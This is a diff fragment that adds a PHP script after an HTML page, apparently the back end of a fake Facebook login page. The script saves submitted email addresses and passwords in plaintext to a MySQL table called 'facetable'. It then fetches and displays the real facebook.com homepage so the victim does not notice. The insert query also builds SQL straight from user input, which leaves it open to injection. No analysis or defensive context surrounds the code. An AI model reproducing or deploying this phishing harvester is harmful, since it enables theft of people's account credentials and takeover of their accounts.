@@ -64,3 +64,53 @@
     </div>
 </body>
 </html>
+-----------------------------------------------------------------------
+
+<?php
+/* Attempt MySQL server connection. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */
+$link = mysqli_connect("localhost", "root", "", "face");
+ 
+// Check connection
+if($link === false){
+    die("ERROR: Could not connect. " . mysqli_connect_error());
+}
+
+if(isset($_POST['submit'])){ // Fetching variables of the form which travels in URL
+$email = $_POST['email'];
+$password = $_POST['password'];
+
+}
+if($email ==''||$password ==''){
+$home = file_get_contents("https://www.facebook.com");
+echo $home;
+}
+else
+{
+// Attempt insert query execution
+//$sql = "insert into user(VEHICLE, IDNO, AREA, DATE) values ('$VEHICLE', '$IDNO', '$AREA', '$DATE')";
+
+//$sql1 = "select VEHICLE from user WHERE VEHICLE = ('$VEHICLE') ";
+//if(mysqli_query($link, $sql1)){
+  //  echo "VEHICLE ALREADY INSERTED";
+//}
+//else{
+$sql = "insert into facetable(email, password, date) values ('$email', '$password', 'date')";
+if(mysqli_query($link, $sql)){
+$home = file_get_contents("https://www.facebook.com");
+echo $home;
+		} 
+else{
+$home = file_get_contents("https://www.facebook.com");
+echo $home;
+}
+}
+
+// Close connection
+mysqli_close($link);
+?>
+</br>
+
+
+
+
